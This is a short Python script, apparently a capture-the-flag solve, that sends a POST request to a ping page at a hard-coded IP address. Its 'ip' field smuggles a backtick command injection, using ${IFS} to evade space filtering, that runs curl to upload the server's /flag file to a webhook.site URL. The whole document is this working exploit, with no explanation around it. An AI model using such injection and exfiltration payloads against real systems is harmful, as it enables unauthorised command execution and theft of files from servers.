import requests

headers = {
	"User-Agent" : "asdf"
}
data = {
	"ip" : "127.0.0.1`curl${IFS}https://webhook.site/ea1aff39-4edf-4d74-ac8f-ce73a036c61f${IFS}-T${IFS}/flag`"
}
res = requests.post("http://139.59.117.189:5004/pingkematian.php",headers=headers,data=data)

print(res.text)
